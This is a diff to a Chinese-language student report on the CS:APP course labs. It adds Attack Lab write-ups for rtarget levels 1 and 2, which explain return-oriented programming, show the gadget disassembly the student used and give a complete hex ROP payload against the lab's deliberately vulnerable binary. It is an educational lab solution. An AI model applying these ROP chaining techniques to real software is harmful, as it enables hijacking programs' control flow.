@@ -6,7 +6,7 @@
 
 ## 实验摘要
 
-在本课程中，我一共完成了下列 2 个实验：
+在本课程中，我一共完成了下列 4 个实验：
 
 - Data Lab：实现简单的逻辑、二进制补码和浮点函数
 - Bomb Lab：通过逆向工程来拆除炸弹
@@ -956,7 +956,7 @@ objdump -d level2.o > level2.d
 
 #### 3. `ctarget` level 3
 
-level 3 的大致要求与 level 2 是一致的。只不过在这里要求传入的参数为 cookie 字符串。为了传入这个字符串，我们需要将 cookie 存入到栈上空间。但是栈的空间在本次是随机的，因此我们需要将这个 cookie 信息存入到一个安全的位置。因此将 cookie 字符串的信息存入到返回地址之后，这样就不会被其它程序所修改。所以 cookie 字符串信息将会保存在离栈顶距离为 `0x28 + 0x8` 字节处位置。其中 `0x28` 字节是由 `getbuf` 分配的栈空间，而 `0x8` 是返回地址所占的空间。所以存储位置为 `0x5561dc78 + 0x28 = 0x5561dca8`
+level 3 的大致要求与 level 2 是一致的。只不过在这里要求传入的参数为 cookie 字符串。为了传入这个字符串，我们需要将 cookie 存入到栈上空间。但是栈的空间在本次是随机的，因此我们需要将这个 cookie 信息存入到一个安全的位置。因此将 cookie 字符串的信息存入到返回地址之后，这样就不会被其它程序所修改。所以 cookie 字符串信息将会保存在离栈顶距离为 `0x28 + 0x8` 字节处位置。其中 `0x28` 字节是由 `getbuf` 分配的栈空间，而 `0x8` 是返回地址所占的空间。所以存储位置为 `0x5561dc78 + 0x28 + 0x8 = 0x5561dca8`
 
 根据提示，我们需要将 cookie 字符串以 ASCII 的形式存储，因此将其存储为：
 
@@ -992,7 +992,105 @@ objdump -d level3.o > level3.d
 
 ![](image/csapp-attacklab-ctarget-level3.png)
 
+#### `rtarget` level 1
 
+`rtarget` 相比之前的 `ctarget` 更难攻击，因为：
+
+- 开启了栈随机化，无法准确获知代码注入的地址
+- PC 无法指向栈内地址，否则会直接报内存错误
+
+但对于 `rtarget`，我们仍然可以利用 ROP 攻击：
+
+ROP 攻击一般得满足如下条件
+
+- 程序存在溢出。
+- 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
+
+gadget 通常是 `ret` 语句结尾，我们通过内存越界更改返回地址，就可以让程序依次执行一系列 gadgets，这样，我们就可以通过一系列 gadgets 拼凑出我们希望执行的指令。例如该例子：
+
+```assembly
+0000000000400f15 <setval_210>:
+	400f15: c7 07 d4 48 89 c7 	movl $0xc78948d4,(%rdi)
+	400f1b: c3 					retq
+```
+
+字节序列 48 89 c7 编码成指令 `movq %rax, %rdi`。这条指令原本的起始地址为 `0x400f15`，如果我们能修改其起始地址为 `0x400f18` 的话，这条指令被执行时就会被编码成为 `movq %rax, %rdi`。因此，我们的目标就是需要从给出的 gadgets 找出这些隐藏起来的指令，然后修改返回地址到这些指令的起始地址，这样就能完成 ROP 攻击，执行我们想要执行的功能目标。
+
+首先还是需要将 `rtarget` 进行反汇编得到 `rtarget.asm`
+
+```bash
+objdump -d rtarget > rtarget.asm
+```
+
+现在，为了完成实验目标，我们还是需要将 cookie 传入到 `%rdi` 当中，且让程序能够成功进入到 `touch2` 程序。为了让 cookie 传入到 `%rdi` 当中，我们还是需要将 cookie 存储到栈上。然后让其 `movq` 到 `%rdi` 当中。但是可以发现给出的附录当中没有相关信息，因此可以排除直接从内存 `movq` 到寄存器 `%rdi` 的想法。但是可以使用 `popq` 到一个寄存器 `R` 中，再使用 `movq, R, %rdi` 来进行操作。因此：
+
+发现 `movq, S, D` 的指令都是以 `48 89` 为起始字节序列的，因此寻找这个结果：
+
+```assembly
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq  
+
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq  
+```
+
+发现只有这两种。因为我们的目标寄存器是 `%rdi`，所以只能选取 `48 89 c7` 这个作为我们的选择。而 `48 89 c7` 对应的正是 `movq %rax, %rdi`，因此我们还需要有  `popq %rax`，因此搜索 `58`：
+
+```assembly
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+```
+
+所以从上面这两条指令，可以给出两个起始地址为 `0x4019ab` 和 `0x4019c5`。那么就有了注入的代码段，接着将其保存在 `phase4.txt` 当中，然后运行：
+
+![](image/csapp-attacklab-rtarget-level1.png)
+
+#### `rtarget` level 2
+
+与 `ctarget` level 3 是一样的，我们需要将 cookie 的字符串信息存储在栈上，然后将 cookie 存储的地址发送给 `%rdi` 寄存器。所以我们需要计算 cookie 存储的地址。从之前的经历我们知道，cookie 存储的地址是通过栈顶寄存器 `%rsp` 和一个偏移量相加来完成的。因此，我们需要利用到 gadgets 当中的加法函数，可以在 `farm.c` 中找到 `add_xy()` 这个函数。
+
+```assembly
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+```
+
+因此，我们需要将 `%rsp` 的值和偏移量作为参数传入该函数当中。
+
+从之前的经历可以知道，`movq` 只存在 `movq %rax, %rdi` 和 `movq %rsp, %rax` 这两种。但是这个刚好符合本题的要求。因此我们可以先执行 `movq %rsp, %rax` 然后再执行 `movq %rax, %rdi`。那这样的话，偏移量就该存到 `%rsi` 寄存器中。同理，使用 `popq` 来将偏移量存入到 `%rsi` 寄存中。因为没有直接的 `popq %rsi` gadget 程序，因此需要先将其 `pop` 到其中某个寄存器当中，然后将其逐步的搬移到 `%rsi` 寄存器当中。最后，调用完 `add_xy()` 函数后，需要把返回值 `%rax` 移动到参数寄存器中 `%rdi`。其中，在将偏移量 `0x48` 移动到寄存器 `%rsi` 之前，需要将其以此的移动到 `%rax`，`%rdx` 和 `%rcx` 寄存器当中。而在移动的过程中，主要使用其 32 位寄存器进行移动。在移动过程中，`movl %edx, %ecx` 这句指令（编码为 `89 d1`）的起始位置在 `0x401a69`：
+
+```assembly
+0000000000401a68 <getval_311>:
+  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
+  401a6d:	c3                   	retq  
+```
+
+在其后面的 `08 db` 字节序列代表的是指令 `orb %bl, %bl`，这句指令执行与否是不会产生任何副作用的，因此这条指令可以安全使用。因此上述移动过程是合法的。
+
+那么就有了注入的代码段，接着将其保存在 `phase5.txt` 当中，然后运行：
+
+```
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00   /* 0x28 bytes for stack space */
+06 1a 40 00 00 00 00 00         /* address of movq %rsp, %rax */
+c5 19 40 00 00 00 00 00         /* address of movq %rax, %rdi */
+ab 19 40 00 00 00 00 00         /* address of popq %rax */
+48 00 00 00 00 00 00 00         /* offset of cookie for pop */
+dd 19 40 00 00 00 00 00         /* address of movl %eax, %edx */
+69 1a 40 00 00 00 00 00         /* address of movl %edx, %ecx */
+13 1a 40 00 00 00 00 00         /* address of movl %ecx, %esi */
+d6 19 40 00 00 00 00 00         /* address of add_xy function */
+c5 19 40 00 00 00 00 00         /* address of movq %rax, %rdi */
+fa 18 40 00 00 00 00 00         /* address of touch3 */
+35 39 62 39 39 37 66 61 00      /* ascii code for 59b997fa */
+```
+
+![](image/csapp-attacklab-rtarget-level2.png)
 
 ### Shell Lab
 
